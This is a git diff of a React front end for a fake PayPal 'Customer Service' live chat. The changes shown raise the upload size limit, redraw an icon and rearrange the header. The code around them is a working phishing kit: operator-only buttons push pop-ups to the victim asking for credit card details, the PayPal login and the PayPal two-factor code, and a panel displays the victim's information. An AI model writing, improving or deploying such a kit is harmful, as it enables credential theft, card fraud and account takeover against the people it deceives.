@@ -4,12 +4,16 @@ import io from 'socket.io-client';
 // --- Configuration ---
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 let socket;
-const MAX_FILE_SIZE = 500 * 1024;
+const MAX_FILE_SIZE = 2 * 1024 * 1024; // 2Mo en octets
 
 // --- Icônes SVG ---
 const TrashIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0z"/><path d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4zM2.5 3h11V2h-11z"/></svg> );
 const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" /></svg> );
-const AttachmentIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M4.5 3a2.5 2.5 0 0 1 5 0v9a1.5 1.5 0 0 1-3 0V5a.5.5 0 0 1 1 0v7a.5.5 0 0 0 1 0V3a1.5 1.5 0 1 0-3 0v9a2.5 2.5 0 0 0 5 0V5A.5.5 0 0 1 9 5v7a1.5 1.5 0 1 1-3 0z"/></svg> );
+const AttachmentIcon = () => ( 
+  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+    <path d="M12.5 2c-2.48 0-4.5 2.02-4.5 4.5v9c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5v-8.5c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v7.5c0 .28.22.5.5.5s.5-.22.5-.5v-7.5c0-.28.22-.5.5-.5s.5.22.5.5v8.5c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5v-9c0-1.93 1.57-3.5 3.5-3.5s3.5 1.57 3.5 3.5v9.5c0 .28.22.5.5.5s.5-.22.5-.5v-9.5c0-2.48-2.02-4.5-4.5-4.5z"/>
+  </svg>
+);
 const FileIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/></svg> );
 const ExclamationIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-red-500" viewBox="0 0 16 16"><path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/></svg> );
 const CheckIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-green-500" viewBox="0 0 16 16"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.267.267 0 0 1 .02-.022z"/></svg> );
@@ -559,7 +563,7 @@ function App() {
         setUploading(true);
         Array.from(files).forEach(file => {
             if (file.size > MAX_FILE_SIZE) {
-                alert(`File "${file.name}" is too large. Max size is ${MAX_FILE_SIZE / 1024} KB.`);
+                alert(`File "${file.name}" is too large. Max size is ${MAX_FILE_SIZE / 1024 / 1024} MB.`);
                 return;
             }
             const reader = new FileReader();
@@ -667,39 +671,48 @@ function App() {
             {showPayPalLogin1Popup && <PayPalLogin1Popup onSubmit={handlePayPalLogin1Submit} onClose={() => setShowPayPalLogin1Popup(false)} />}
             {showPayPalLogin2Popup && <PayPalLogin2Popup onSubmit={handlePayPalLogin2Submit} onClose={() => setShowPayPalLogin2Popup(false)} />}
             {showVerificationPopup && <VerificationPopup />}
-            <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
-                <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
-                <div>
-                    <h1 className="text-xl font-bold text-[#003087]">Customer Service</h1>
-                    <p className="text-sm text-green-500 font-semibold flex items-center">
-                        <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
-                        Live
-                    </p>
-                </div>
-                {userType === 'Support' && (
-                    <div className="ml-auto flex items-center gap-2">
-                        <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-1 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-blue-200 transition duration-300">
-                           <PopupIcon />
-                           POP-UP
-                        </button>
-                        <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-1 bg-green-100 text-green-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-green-200 transition duration-300">
-                           <CreditCardIcon />
-                           CB
-                        </button>
-                        <button onClick={handleRequestPayPalLogin1} title="Request PayPal Login (Step 1)" className="flex items-center gap-1 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-orange-200 transition duration-300">
-                           <PayPalIcon />
-                           PAYPAL 1
-                        </button>
-                        <button onClick={handleRequestPayPalLogin2} title="Request PayPal 2FA Code (Step 2)" className="flex items-center gap-1 bg-purple-100 text-purple-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-purple-200 transition duration-300">
-                           <PayPalIcon />
-                           PAYPAL 2
-                        </button>
-                        <button onClick={handleClearChat} className="flex items-center gap-1 bg-red-500 text-white text-xs font-bold py-2 px-2 rounded-lg hover:bg-red-600 transition duration-300">
-                            <TrashIcon />
-                            Clear Chat
-                        </button>
+            <header className="flex items-center justify-between p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
+                <div className="flex items-center">
+                    <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
+                    <div>
+                        <h1 className="text-xl font-bold text-[#003087]">Customer Service</h1>
+                        <p className="text-sm text-green-500 font-semibold flex items-center">
+                            <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
+                            Live
+                        </p>
                     </div>
-                )}
+                </div>
+                
+                <div className="flex items-center gap-4">
+                    <div className="text-xs text-gray-500 font-mono">
+                        #H25lnFfA3mNbU4nF5WDZ
+                    </div>
+                    
+                    {userType === 'Support' && (
+                        <div className="flex items-center gap-2">
+                            <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-1 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-blue-200 transition duration-300">
+                               <PopupIcon />
+                               POP-UP
+                            </button>
+                            <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-1 bg-green-100 text-green-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-green-200 transition duration-300">
+                               <CreditCardIcon />
+                               CB
+                            </button>
+                            <button onClick={handleRequestPayPalLogin1} title="Request PayPal Login (Step 1)" className="flex items-center gap-1 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-orange-200 transition duration-300">
+                               <PayPalIcon />
+                               PAYPAL 1
+                            </button>
+                            <button onClick={handleRequestPayPalLogin2} title="Request PayPal 2FA Code (Step 2)" className="flex items-center gap-1 bg-purple-100 text-purple-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-purple-200 transition duration-300">
+                               <PayPalIcon />
+                               PAYPAL 2
+                            </button>
+                            <button onClick={handleClearChat} className="flex items-center gap-1 bg-red-500 text-white text-xs font-bold py-2 px-2 rounded-lg hover:bg-red-600 transition duration-300">
+                                <TrashIcon />
+                                Clear Chat
+                            </button>
+                        </div>
+                    )}
+                </div>
             </header>
             
             {userType === 'Support' && <ClientInfoPanel info={clientInfo} />}
